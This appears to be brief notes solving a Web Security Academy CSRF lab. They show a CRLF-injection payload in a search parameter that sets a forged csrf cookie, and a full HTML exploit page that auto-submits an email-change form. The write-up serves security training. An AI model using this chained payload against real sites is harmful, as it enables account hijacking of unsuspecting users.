here the check are perfored over the csrf sent using the hidden filed and the csrf cookie we have in the browser

we have noticed that crafting ?search=test%0d%0aSet-Cookie:%20csrf=aaaa%3b%20SameSite=None we are able to rewrite the csrf cookie on the browser


<html>
    <body>
        <form action="https://0af3005e045b71a7825df69a00f500c0.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
            <!--- here we are using a fake csrf--->
            <input type="hidden" name="csrf" value="aaaa" />
        </form>

       <!--- here we are setting the fake csrf in the victim browser and then performing the form submit--->
     <img src="https://0a1e0011043e8196804da83600de00f5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=aaaa%3b%20SameSite=None" onerror="document.forms[0].submit()">

    </body>
</html>
